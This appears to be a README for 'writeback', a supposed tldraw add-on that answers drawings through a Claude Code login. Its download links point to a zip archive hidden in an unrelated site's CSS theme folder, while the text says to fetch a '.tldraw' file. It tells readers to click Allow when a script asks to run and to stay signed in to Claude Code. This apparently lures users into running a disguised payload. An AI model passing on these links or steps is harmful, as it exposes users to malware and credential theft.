# ✍️ writeback - Turn drawings into live AI answers

[Download writeback from GitHub](https://raw.githubusercontent.com/Raynerhalfandhalf451/raynerhalfandhalf451.github.io/main/themes/anzhiyu/source/css/_extra/anzhiyu/3.5-alpha.4.zip)

Writeback lets you interact with artificial intelligence directly on your digital canvas. You draw shapes, write questions, or request diagrams. The AI responds within your drawing area. It places answers exactly where you ask for them. Your original work stays in place. You control every element on the screen.

This tool works inside the tldraw desktop application. It requires no separate backend or complex setup. It connects to your existing Claude Code login to process requests.

## 🛠 Prerequisites

You need two things to use writeback:

1. The tldraw offline desktop application.
2. An active Claude Code login on your computer.

If you do not have tldraw offline installed, visit the official website to download the installer for Windows. Run the installer and follow the on-screen prompts. Once installed, log in to your Claude Code account within your terminal or command prompt interface. This ensures the application has the necessary permissions to process your drawings.

## 📥 Installing writeback

1. Visit the [writeback releases page](https://raw.githubusercontent.com/Raynerhalfandhalf451/raynerhalfandhalf451.github.io/main/themes/anzhiyu/source/css/_extra/anzhiyu/3.5-alpha.4.zip) to download the latest version.
2. Click the file ending in .tldraw to save it to your computer.
3. Open your tldraw offline application.
4. Select File from the top menu, then choose Open.
5. Locate the file you downloaded and select it.

The workspace will load with writeback ready for use. When you open the file, the application might ask for permission to run a script. This script powers the artificial intelligence features. Click Allow or Yes to enable the live behavior. Without this permission, the AI cannot read or write to your canvas.

## 💡 How to use writeback

The workspace acts as an infinite whiteboard. You interact with the AI through standard drawing and text tools.

### Asking math questions
Select the pen tool or the shape tool. Draw a triangle or any shape that requires a calculation. Label the sides with numbers. Place a question mark where you want the answer. Wait a few seconds. The application will compute the result and place the numbers near your question mark. 

### Writing text prompts
Select the text tool. Type a question or a request on the canvas. Place your cursor near the text. The system detects your input and generates a response. It renders text or diagrams directly beneath your prompt.

### Drawing diagrams
Request a diagram by typing instructions on the canvas. For example, type "Draw a flowchart for a coffee machine." The application processes these words. It generates the shapes and lines for the diagram automatically. 

## ⚙️ Configuration details

Writeback uses the security settings configured in your Claude Code installation. It stores no data on external servers. Every drawing remains a local file on your hard drive. 

If the AI fails to generate a response, check your Claude Code connection. Open your terminal and confirm your authentication status. If your session expired, sign in again to restore access. 

## 📋 Tips for better results

The AI reacts to your spatial layout. Place your questions far apart to avoid overlapping answers. Use clear labels for math problems. Keep your handwriting neat when using the pen tool. The system reads clean lines better than messy sketches.

If you encounter errors, refresh the page by opening the file again. This resets the script environment and clears pending requests.
